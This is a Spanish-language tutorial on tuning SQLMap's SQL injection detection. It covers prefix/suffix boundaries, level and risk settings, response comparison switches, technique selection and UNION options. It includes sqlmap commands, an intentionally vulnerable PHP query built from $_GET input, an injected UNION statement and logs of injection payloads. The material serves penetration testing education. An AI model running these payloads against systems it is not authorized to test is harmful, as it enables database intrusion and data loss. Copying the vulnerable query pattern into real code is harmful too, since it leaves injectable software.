En la mayoría de los casos, SQLMap debería funcionar correctamente con los detalles del target proporcionados. Sin embargo, hay opciones para ajustar los intentos de inyección SQLi para ayudar a SQLMap en la fase de detección. Cada payload enviado al target consiste en:

- vector (e.g., `UNION ALL SELECT 1,2,VERSION()`): parte central del payload, que lleva el código SQL útil a ejecutarse en el target.
    
- boundaries (e.g. `'<vector>-- -`): formaciones de prefijo y sufijo, utilizadas para la inyección adecuada del vector en la declaración SQL vulnerable.
    
---

## Prefix/Suffix

En casos raros, es necesario utilizar valores de prefijo y sufijo especiales que no están cubiertos por la ejecución regular de SQLMap. Para tales ejecuciones, se pueden usar las opciones `--prefix` y `--suffix` de la siguiente manera:

```r
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

Esto resultará en un encuadre de todos los valores del vector entre el prefijo estático `%'))` y el sufijo `-- -`. Por ejemplo, si el código vulnerable en el target es:

```r
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
```

El vector `UNION ALL SELECT 1,2,VERSION()`, delimitado con el prefijo `%'))` y el sufijo `-- -`, resultará en la siguiente declaración SQL (válida) en el target:

```r
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

---

## Level/Risk

Por defecto, SQLMap combina un conjunto predefinido de boundaries más comunes (es decir, pares de prefijo/sufijo), junto con los vectores que tienen una alta probabilidad de éxito en caso de un target vulnerable. No obstante, existe la posibilidad de que los usuarios utilicen conjuntos más grandes de boundaries y vectores, ya incorporados en SQLMap.

Para tales demandas, se deben usar las opciones `--level` y `--risk`:

- La opción `--level` (`1-5`, por defecto `1`) amplía tanto los vectores como los boundaries utilizados, según su expectativa de éxito (es decir, cuanto menor sea la expectativa, mayor será el nivel).
    
- La opción `--risk` (`1-3`, por defecto `1`) amplía el conjunto de vectores utilizados según su riesgo de causar problemas en el lado del target (es decir, riesgo de pérdida de entrada en la base de datos o denegación de servicio).
    

La mejor manera de verificar las diferencias entre los boundaries y payloads utilizados para diferentes valores de `--level` y `--risk`, es usar la opción `-v` para configurar el nivel de verbosidad. En la verbosidad 3 o superior (e.g., `-v 3`), se mostrarán mensajes que contienen el `[PAYLOAD]` utilizado, de la siguiente manera:

```r
sqlmap -u www.example.com/?id=1 -v 3 --level=5

...SNIP...
[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:17:07] [PAYLOAD] 1) AND 5907=7031-- AuiO
[14:17:07] [PAYLOAD] 1) AND 7891=5700 AND (3236=3236
...SNIP...
[14:17:07] [PAYLOAD] 1')) AND 1049=6686 AND (('OoWT' LIKE 'OoWT
[14:17:07] [PAYLOAD] 1'))) AND 4534=9645 AND ((('DdNs' LIKE 'DdNs
[14:17:07] [PAYLOAD] 1%' AND 7681=3258 AND 'hPZg%'='hPZg
...SNIP...
[14:17:07] [PAYLOAD] 1")) AND 4540=7088 AND (("hUye"="hUye
[14:17:07] [PAYLOAD] 1"))) AND 6823=7134 AND ((("aWZj"="aWZj
[14:17:07] [PAYLOAD] 1" AND 7613=7254 AND "NMxB"="NMxB
...SNIP...
[14:17:07] [PAYLOAD] 1"="1" AND 3219=7390 AND "1"="1
[14:17:07] [PAYLOAD] 1' IN BOOLEAN MODE) AND 1847=8795#
[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
```

Por otro lado, los payloads utilizados con el valor por defecto `--level` tienen un conjunto de boundaries considerablemente más pequeño:

```r
sqlmap -u www.example.com/?id=1 -v 3
...SNIP...
[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:20:36] [PAYLOAD] 1) AND 2678=8644 AND (3836=3836
[14:20:36] [PAYLOAD] 1 AND 7496=4313
[14:20:36] [PAYLOAD] 1 AND 7036=6691-- DmQN
[14:20:36] [PAYLOAD] 1') AND 9393=3783 AND ('SgYz'='SgYz
[14:20:36] [PAYLOAD] 1' AND 6214=3411 AND 'BhwY'='BhwY
[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
```

En cuanto a los vectores, podemos comparar los payloads utilizados de la siguiente manera:

```r
sqlmap -u www.example.com/?id=1
...SNIP...
[14:42:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:42:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[14:42:38] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
...SNIP...
```

```r
sqlmap -u www.example.com/?id=1 --level=5 --risk=3

...SNIP...
[14:46:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
...SNIP...
[14:46:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[14:46:05] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[14:46:05] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
...SNIP...
[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[14:46:05] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
...SNIP...
[14:46:05] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[14:46:06] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[14:46:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
...SNIP...
```

En cuanto al número de payloads, por defecto (es decir, `--level=1 --risk=1`), el número de payloads utilizados para probar un solo parámetro llega hasta 72, mientras que en el caso más detallado (`--level=5 --risk=3`), el número de payloads aumenta a 7,865.

Dado que SQLMap ya está ajustado para verificar los boundaries y vectores más comunes, se aconseja a los usuarios regulares no tocar estas opciones porque harán que todo el proceso de detección sea considerablemente más lento. No obstante, en casos especiales de vulnerabilidades SQLi, donde es imprescindible el uso de payloads `OR` (por ejemplo, en el caso de páginas de `login`), es posible que tengamos que aumentar el nivel de riesgo nosotros mismos.

Esto se debe a que los payloads `OR` son inherentemente peligrosos en una ejecución por defecto, donde las declaraciones SQL subyacentes vulnerables (aunque

 menos comúnmente) están modificando activamente el contenido de la base de datos (por ejemplo, `DELETE` o `UPDATE`).

---

## Advanced Tuning

Para ajustar aún más el mecanismo de detección, existe un amplio conjunto de interruptores y opciones. En casos regulares, SQLMap no requerirá su uso. Aun así, debemos estar familiarizados con ellos para poder utilizarlos cuando sea necesario.

### Status Codes

Por ejemplo, al tratar con una respuesta de target grande con mucho contenido dinámico, las diferencias sutiles entre respuestas `TRUE` y `FALSE` podrían usarse para fines de detección. Si la diferencia entre respuestas `TRUE` y `FALSE` puede verse en los códigos HTTP (por ejemplo, `200` para `TRUE` y `500` para `FALSE`), la opción `--code` podría usarse para fijar la detección de respuestas `TRUE` a un código HTTP específico (por ejemplo, `--code=200`).

### Titles

Si la diferencia entre respuestas puede verse inspeccionando los títulos de las páginas HTTP, el interruptor `--titles` podría usarse para instruir al mecanismo de detección a basar la comparación en el contenido de la etiqueta HTML `<title>`.

### Strings

En el caso de que un valor de cadena específico aparezca en respuestas `TRUE` (por ejemplo, `success`), mientras está ausente en respuestas `FALSE`, la opción `--string` podría usarse para fijar la detección solo en la aparición de ese valor único (por ejemplo, `--string=success`).

### Text-only

Al tratar con una gran cantidad de contenido oculto, como ciertas etiquetas de comportamiento de página HTML (por ejemplo, `<script>`, `<style>`, `<meta>`, etc.), podemos usar el interruptor `--text-only`, que elimina todas las etiquetas HTML y basa la comparación solo en el contenido textual (es decir, visible).

### Techniques

En algunos casos especiales, debemos restringir los payloads utilizados solo a un tipo específico. Por ejemplo, si los payloads basados en tiempo están causando problemas en forma de tiempos de espera de respuesta, o si queremos forzar el uso de un tipo específico de payload SQLi, la opción `--technique` puede especificar la técnica SQLi a utilizar.

Por ejemplo, si queremos omitir los payloads basados en tiempo y apilamiento SQLi y solo probar los payloads basados en boolean, error y UNION-query, podemos especificar estas técnicas con `--technique=BEU`.

### UNION SQLi Tuning

En algunos casos, los payloads `UNION` SQLi requieren información adicional proporcionada por el usuario para funcionar. Si podemos encontrar manualmente el número exacto de columnas de la consulta SQL vulnerable, podemos proporcionar este número a SQLMap con la opción `--union-cols` (por ejemplo, `--union-cols=17`). En caso de que los valores de relleno "dummy" predeterminados utilizados por SQLMap -`NULL` y un entero aleatorio- no sean compatibles con los valores de los resultados de la consulta SQL vulnerable, podemos especificar un valor alternativo en su lugar (por ejemplo, `--union-char='a'`).

Además, en caso de que sea necesario usar un apéndice al final de una consulta `UNION` en la forma de `FROM <table>` (por ejemplo, en el caso de Oracle), podemos configurarlo con la opción `--union-from` (por ejemplo, `--union-from=users`).  
No usar automáticamente el apéndice `FROM` adecuado podría deberse a la incapacidad de detectar el nombre del DBMS antes de su uso.